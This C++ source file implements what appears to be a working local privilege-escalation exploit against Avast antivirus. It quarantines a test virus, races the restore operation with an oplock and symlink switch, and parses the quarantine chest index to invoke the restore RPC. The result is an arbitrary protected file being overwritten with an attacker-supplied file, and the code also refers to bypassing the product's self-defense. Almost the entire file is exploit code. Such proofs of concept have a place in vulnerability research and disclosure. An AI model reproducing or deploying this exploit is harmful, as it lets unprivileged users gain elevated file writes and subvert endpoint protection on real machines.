#include <Windows.h>
#include <MsXml6.h>
#include <atlbase.h>

#include "AswRestoreFileExploit.h"
#include "detours.h"
#include "wil/stl.h"
#include "wil/resource.h"
#include "wil/win32_helpers.h"
#include "CommonUtils/CommonUtils.h"
#include "SymbolicLinkUtils/CommonUtils.h"
#include "SymbolicLinkUtils/FileSymlink.h"
#include "SymbolicLinkUtils/FileOpLock.h"
#include "AavmRpcClientV2/AavmRpcClientV2.h"

#include <string>
#include <thread>
#include <vector>
#include <fstream>
#include <iostream>
#include <stdexcept>
#include <filesystem>

namespace fs = std::filesystem;

EntryPointType g_originalEntryPoint;

void CALLBACK ExploitW(
    _In_ HWND      Window,
    _In_ HINSTANCE ModuleHandle,
    _In_ LPWSTR    CommandLine,
    _In_ INT       ShowCommand
)
{
    UNREFERENCED_PARAMETER(Window);
    UNREFERENCED_PARAMETER(ModuleHandle);
    UNREFERENCED_PARAMETER(ShowCommand);

    try
    {
        int argumentsCount;

        auto pArgv = ::CommandLineToArgvW(CommandLine, &argumentsCount);
        if (!pArgv)
            throw std::runtime_error("CommandLineToArgvW failed. Error: " + std::to_string(::GetLastError()));
        auto freeArgvOnExit = wil::scope_exit([pArgv] { ::LocalFree(pArgv); });

        if (CommandLine[0] == L'\0' || argumentsCount != 2)
            throw std::runtime_error("Invalid usage! Usage: rundll32.exe AswQuarantineFileExploit.dll,Exploit TargetFilePath");

        //
        // Step 0: Bypass self-defense and pass arguments
        //

        BypassSelfDefense(pArgv[0], pArgv[1]);
    }
    catch (const std::exception &e)
    {
        // ToDo: Log error
        std::cerr << "Exception: " << e.what() << std::endl;
        __debugbreak();
    }
}

namespace
{
    auto CreateNativeSymlink(
        _In_ const fs::path &srcPath,
        _In_ const fs::path &dstPath
    )
    {
        auto pSymlink = std::make_unique<FileSymlink>();
        if (!pSymlink->CreateSymlink(srcPath.c_str(), dstPath.c_str(), nullptr))
            throw std::runtime_error("Cannot create symlink from " + srcPath.string() + " to " + dstPath.string() + ". Error: " + std::to_string(::GetLastError()));

        return pSymlink;
    }

    std::unique_ptr<FileOpLock> ExecuteOnPostProbePath(
        _In_ const fs::path &probeAccessFilePath,
        _In_ const std::function<void(void)> &postProbeFileAccessCallback
    )
    {
        std::unique_ptr<FileOpLock> pFileOpLock;

        while (!pFileOpLock)
        {
            pFileOpLock = std::unique_ptr<FileOpLock>(
                FileOpLock::CreateLock(
                    probeAccessFilePath,
                    L"rw",
                    postProbeFileAccessCallback));
            if (!pFileOpLock)
            {
                if (::GetLastError() == ERROR_OPLOCK_NOT_GRANTED || ::GetLastError() == ERROR_PATH_NOT_FOUND)
                {
                    std::cout << "[*] FileOpLock::CreateLock() failed. Error: " << ::GetLastError() << ". Sleeping for 10 seconds..." << std::endl;

                    using namespace std::chrono_literals;
                    std::this_thread::sleep_for(10s);

                    continue;
                }

                throw std::runtime_error("Cannot create oplock on " + probeAccessFilePath.string() + ". Error: " + std::to_string(::GetLastError()));
            }

            break;
        }

        return pFileOpLock;
    }

    void HexStringToBytes(const wchar_t *hexString, size_t stringLength, unsigned char *bytesBuffer)
    {
        for (auto i = 0; i < stringLength / 2; ++i)
        {
            wchar_t hexValue[3] = { hexString[i * 2 + 0], hexString[i * 2 + 1], L'\0' };
            bytesBuffer[i] =
                static_cast<unsigned char>(::wcstol(hexValue, nullptr, 16));
        }
    }

    std::wstring GetNodeTextData(IXMLDOMNode *pNode)
    {
        CComPtr<IXMLDOMNode> pChildNode;
        HRESULT hr = pNode->get_firstChild(&pChildNode);
        if (FAILED(hr))
            throw std::runtime_error("get_firstChild() failed. Error: " + std::to_string(hr));

        CComVariant nodeText;
        hr = pChildNode->get_nodeValue(&nodeText);
        if (FAILED(hr))
            throw std::runtime_error("get_text() failed. Error: " + std::to_string(hr));

        if (nodeText.vt != VT_BSTR)
            return L"";

        return nodeText.bstrVal;
    }

    bool GetChestEntry(
        const fs::path &chestIndexFilePath, const fs::path &malwareFilePath, long &chestId, std::vector<unsigned char> &idpBlob)
    {
        auto hr = ::CoInitialize(NULL);
        if (FAILED(hr))
            throw std::runtime_error("CoInitialize() failed. Error: " + std::to_string(hr));

        auto coUninitializeOnExit = wil::scope_exit([] () { ::CoUninitialize(); });

        CComPtr<IXMLDOMDocument> pXmlDomDocument;
        hr = pXmlDomDocument.CoCreateInstance(__uuidof(DOMDocument60));
        if (FAILED(hr))
            throw std::runtime_error("CoCreateInstance() failed. Error: " + std::to_string(hr));

        VARIANT_BOOL isSuccessful;
        hr = pXmlDomDocument->load(CComVariant(chestIndexFilePath.c_str()), &isSuccessful);
        if (FAILED(hr) || isSuccessful != VARIANT_TRUE)
            throw std::runtime_error("load() failed. Error: " + std::to_string(hr));

        CComPtr<IXMLDOMElement> pRootElement;
        hr = pXmlDomDocument->get_documentElement(&pRootElement);
        if (FAILED(hr))
            throw std::runtime_error("get_documentElement() failed. Error: " + std::to_string(hr));

        CComPtr<IXMLDOMNodeList> pChestEntryNodes;
        hr = pRootElement->selectNodes(CComBSTR(L"ChestEntry"), &pChestEntryNodes);
        if (FAILED(hr))
            throw std::runtime_error("selectNodes() failed. Error: " + std::to_string(hr));

        if (!pChestEntryNodes)
            throw std::runtime_error("Cannot obtain ChestEntry nodes!");

        long chestEntryCount;
        hr = pChestEntryNodes->get_length(&chestEntryCount);
        if (FAILED(hr))
            throw std::runtime_error("get_length() failed. Error: " + std::to_string(hr));

        for (auto i = 0; i < chestEntryCount; i++)
        {
            CComPtr<IXMLDOMNode> pChestEntryNode;
            hr = pChestEntryNodes->get_item(i, &pChestEntryNode);
            if (FAILED(hr))
                throw std::runtime_error("get_item() failed. Error: " + std::to_string(hr));

            CComPtr<IXMLDOMNode> pChestIdNode;
            hr = pChestEntryNode->selectSingleNode(CComBSTR(L"ChestId"), &pChestIdNode);
            if (FAILED(hr))
                throw std::runtime_error("selectSingleNode() failed. Error: " + std::to_string(hr));

            if (!pChestIdNode)
                continue;

            chestId = std::stol(GetNodeTextData(pChestIdNode), nullptr, 16);

            CComPtr<IXMLDOMNode> pFileNameNode;
            hr = pChestEntryNode->selectSingleNode(CComBSTR(L"OrigFileName"), &pFileNameNode);
            if (FAILED(hr))
                throw std::runtime_error("selectSingleNode() failed. Error: " + std::to_string(hr));

            if (!pFileNameNode)
                continue;

            auto origFileName = GetNodeTextData(pFileNameNode);
            if (malwareFilePath.filename() != origFileName)
                continue;

            CComPtr<IXMLDOMNode> pIdpBlobNode;
            hr = pChestEntryNode->selectSingleNode(CComBSTR(L"IDPBlob"), &pIdpBlobNode);
            if (FAILED(hr))
                throw std::runtime_error("selectSingleNode() failed. Error: " + std::to_string(hr));

            if (pIdpBlobNode)
            {
                auto idpBlobString = GetNodeTextData(pIdpBlobNode);

                idpBlob.resize(idpBlobString.size() / 2);
                HexStringToBytes(idpBlobString.data(), idpBlobString.size(), &idpBlob[0]);
            }

            return true;
        }

        return false;
    }

    void AswRestoreFileExploit(const fs::path &targetFilePath)
    {
        auto thisModuleBaseAddress =
            DetourGetContainingModule(DetourCodeFromPointer(AswRestoreFileExploit, nullptr));
        if (!thisModuleBaseAddress)
            throw std::runtime_error("DetourGetContainingModule failed");

        const auto thisModulePath =
            fs::path(wil::GetModuleFileNameW<std::wstring>(thisModuleBaseAddress));
        const auto thisModuleParentPath = thisModulePath.parent_path(); // User accessible path

        const auto switchDirectoryPath = thisModuleParentPath / L"Switch";
        const auto malwareFilePath = switchDirectoryPath / (utils::com::CreateGuid() + ".dll");
        const auto probeFilePath = LR"(C:\$AV_ASW\$VAULT\vault.db)";

        {
            fs::create_directory(switchDirectoryPath);
            auto removeDirectory = wil::scope_exit([&switchDirectoryPath] { fs::remove(switchDirectoryPath); });

            std::cout << "[*] Creating test virus " << malwareFilePath << "..." << std::endl;
            utils::av::CreateTestVirus(malwareFilePath);
            std::cout << "[+] Test virus successfully created." << std::endl;

            std::cout << "[*] Waiting for test virus will be quarantined... You can force it if scan this file manually." << std::endl;
            utils::av::WaitUntilVirusWillBeQuarantined(malwareFilePath);
            std::cout << "[+] Test virus successfully removed." << std::endl;
        }

        fs::create_directory(switchDirectoryPath);
        auto removeDirectory = wil::scope_exit([&switchDirectoryPath] { std::error_code errorCode; fs::remove(switchDirectoryPath, errorCode); });

        std::unique_ptr<FileSymlink> pNativeSymlink;

        auto switchJunctionToUserInAccessibleLocation =
            [&pNativeSymlink, &malwareFilePath, &targetFilePath] () { pNativeSymlink = CreateNativeSymlink(malwareFilePath, targetFilePath); };

        std::wcout << L"[*] Creating oplock on \"" << probeFilePath << L"\" to switch junction \"" << malwareFilePath
            << L"\" to user inaccessible directory \"" << targetFilePath << L"\" just post probe file access..." << std::endl;
        auto pProbeFileAccessOpLock =
            ExecuteOnPostProbePath(probeFilePath, std::move(switchJunctionToUserInAccessibleLocation));
        std::cout << "[+] Oplock successfully created." << std::endl;

        constexpr auto chestIndexFilePath = LR"(C:\ProgramData\Avast Software\Avast\chest\index.xml)";

        long chestId;
        std::vector<unsigned char> idpBlob;

        if (!GetChestEntry(chestIndexFilePath, malwareFilePath, chestId, idpBlob))
            throw std::runtime_error("GetChestEntry() failed.");

        AavmRpcClient aavmRpcClient;
        aavmRpcClient.RestoreQuarantinedFile(chestId, idpBlob.data(), static_cast<long>(idpBlob.size()));

        std::cout << "[*] Waiting for test virus will be restored..." << std::endl;
        pProbeFileAccessOpLock->WaitForLock(INFINITE);
        utils::av::WaitUntilVirusWillBeRestored(targetFilePath);
        std::cout << "[+] Test virus successfully restored." << std::endl;

        // ToDO: RemoveNativeSymlink
    }
} // anonymous namespace

int APIENTRY EscalatePrivileges()
{
    try
    {
        auto pCommandLine = ::GetCommandLineW();
        int argumentsCount;

        auto pArgv = ::CommandLineToArgvW(pCommandLine, &argumentsCount);
        if (!pArgv)
            throw std::runtime_error("CommandLineToArgvW failed. Error: " + std::to_string(::GetLastError()));
        auto freeArgvOnExit = wil::scope_exit([pArgv] { ::LocalFree(pArgv); });

        if (argumentsCount != 3)
            throw std::runtime_error("Invalid usage!");

        const std::wstring sourceFilePath = pArgv[1];
        const std::wstring targetFilePath = pArgv[2];

        //
        // Step 1: Create test file, quarantine it and restore in arbitrary location with permissive DACL
        //

        AswRestoreFileExploit(targetFilePath);

        //
        // Step 2: Simply overwrite restored file with source file
        //

        fs::copy_file(sourceFilePath, targetFilePath, fs::copy_options::overwrite_existing);
    }
    catch (const std::exception &e)
    {
        // ToDo: Log error
        std::cerr << "Exception: " << e.what() << std::endl;
        __debugbreak();
    }

    ::ExitProcess(0);

    //return /*g_originalEntryPoint()*/0;
}
